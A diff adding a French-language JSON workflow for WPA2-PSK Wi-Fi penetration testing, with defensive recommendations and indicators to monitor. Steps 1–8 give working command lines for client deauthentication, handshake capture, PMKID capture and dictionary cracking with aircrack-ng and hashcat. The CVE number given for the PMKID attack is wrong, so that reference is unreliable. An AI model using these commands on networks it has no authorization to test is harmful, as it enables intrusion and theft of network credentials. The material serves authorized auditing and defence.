@@ -1,0 +1,160 @@
+{
+  "title": "WiFi WPA2-PSK Penetration Test Workflow",
+  "version": "1.0.0",
+  "author": "Th3 Thirty3 Security Team",
+  "ethical_notice": "À utiliser uniquement dans un cadre légal avec autorisation écrite du propriétaire du réseau",
+  "description": "Plan d'audit complet pour test de pénétration WiFi WPA2-PSK",
+  
+  "prerequisites": {
+    "hardware": ["Carte WiFi compatible mode monitor (ex: Alfa AWUS036ACH)"],
+    "software": ["Kali Linux", "aircrack-ng suite", "hashcat/hashcat-utils"],
+    "permissions": ["Autorisation écrite du propriétaire", "Cadre légal défini"]
+  },
+
+  "workflow": [
+    {
+      "step": 1,
+      "phase": "Préparation",
+      "description": "Activer le mode monitor sur l'interface WiFi",
+      "tool": "airmon-ng",
+      "command": "airmon-ng start <interface>",
+      "expected_output": "(monitor mode enabled)",
+      "notes": "Vérifie que l'interface devient wlan0mon"
+    },
+    {
+      "step": 2,
+      "phase": "Reconnaissance",
+      "description": "Scanner les réseaux WiFi environnants",
+      "tool": "airodump-ng",
+      "command": "airodump-ng <interface>",
+      "expected_output": "Liste des BSSID, ESSID, canal, nombre de clients",
+      "notes": "Noter le BSSID et le canal de la cible"
+    },
+    {
+      "step": 3,
+      "phase": "Capture Ciblée",
+      "description": "Capturer le trafic sur le canal cible",
+      "tool": "airodump-ng",
+      "command": "airodump-ng -c <channel> --bssid <BSSID> -w <output_file> <interface>",
+      "expected_output": "Fichier .cap créé avec trafic",
+      "notes": "Attendre capture du handshake WPA ou lancer deauth"
+    },
+    {
+      "step": 4,
+      "phase": "Attaque Active",
+      "description": "Déauthentifier un client pour forcer un nouveau handshake",
+      "tool": "aireplay-ng",
+      "command": "aireplay-ng -0 5 -a <BSSID> -c <client_mac> <interface>",
+      "expected_output": "Sending directed DeAuth",
+      "notes": "Attendre la reconnexion du client et capture du handshake"
+    },
+    {
+      "step": 5,
+      "phase": "Vérification Handshake",
+      "description": "Vérifier que le handshake WPA a été capturé",
+      "tool": "aircrack-ng",
+      "command": "aircrack-ng <capture_file>.cap",
+      "expected_output": "1 handshake",
+      "condition": "If handshake captured",
+      "notes": "Si pas de handshake, répéter étape 4"
+    },
+    {
+      "step": 6,
+      "phase": "Cracking",
+      "description": "Attaque par dictionnaire sur le handshake capturé",
+      "tools": [
+        {
+          "name": "aircrack-ng",
+          "command": "aircrack-ng -w <wordlist> -b <BSSID> <capture_file>.cap",
+          "notes": "Méthode CPU, plus lente mais universelle"
+        },
+        {
+          "name": "hashcat",
+          "process": "1. Convertir: cap2hccapx <capture_file>.cap hash.hccapx\n2. Cracker: hashcat -m 2500 hash.hccapx <wordlist>",
+          "notes": "Méthode GPU, beaucoup plus rapide"
+        }
+      ],
+      "expected_output": "KEY FOUND! [password]"
+    },
+    {
+      "step": 7,
+      "phase": "PMKID Attack (Alternative)",
+      "description": "Attaque PMKID sans client connecté (CVE-2018-14847)",
+      "tools": [
+        {
+          "name": "hcxdumptool",
+          "command": "hcxdumptool -i <interface> -o pmkid.pcapng --enable_status=1",
+          "notes": "Capture le PMKID du AP"
+        },
+        {
+          "name": "hcxpcapngtool",
+          "command": "hcxpcapngtool -o hash.22000 pmkid.pcapng",
+          "notes": "Convertit pour hashcat"
+        },
+        {
+          "name": "hashcat",
+          "command": "hashcat -m 22000 hash.22000 <wordlist>",
+          "notes": "Crack le PMKID"
+        }
+      ],
+      "alternative_to": "Steps 3-6",
+      "notes": "Ne nécessite pas de client connecté"
+    },
+    {
+      "step": 8,
+      "phase": "Nettoyage",
+      "description": "Désactiver le mode monitor et restaurer l'interface",
+      "tool": "airmon-ng",
+      "command": "airmon-ng stop <interface>",
+      "expected_output": "(monitor mode disabled)",
+      "notes": "Interface revient à wlan0"
+    },
+    {
+      "step": 9,
+      "phase": "Rapport",
+      "description": "Documenter les résultats",
+      "manual": true,
+      "checklist": [
+        "Réseau testé (BSSID, ESSID)",
+        "Vulnérabilités identifiées",
+        "Mot de passe compromis (si applicable)",
+        "Recommandations de sécurité",
+        "Date et heure de l'audit"
+      ]
+    }
+  ],
+
+  "defensive_recommendations": [
+    {
+      "id": "DEF-001",
+      "title": "Migrer vers WPA3",
+      "description": "WPA3-SAE résiste aux attaques par dictionnaire offline",
+      "priority": "HIGH"
+    },
+    {
+      "id": "DEF-002",
+      "title": "Activer 802.11w (PMF)",
+      "description": "Protection Management Frames empêche les attaques deauth",
+      "priority": "HIGH"
+    },
+    {
+      "id": "DEF-003",
+      "title": "Mot de passe fort",
+      "description": "Minimum 16 caractères, aléatoire, pas dans les dictionnaires",
+      "priority": "CRITICAL"
+    },
+    {
+      "id": "DEF-004",
+      "title": "Surveillance WIDS",
+      "description": "Déployer un système de détection d'intrusion sans fil",
+      "priority": "MEDIUM"
+    }
+  ],
+
+  "iocs_to_monitor": [
+    "Nombreuses déauthentifications (reason code 7)",
+    "Nouveaux BSSID avec même ESSID (Evil Twin)",
+    "Frames beacon anormaux",
+    "Changements fréquents de canal par les clients"
+  ]
+}
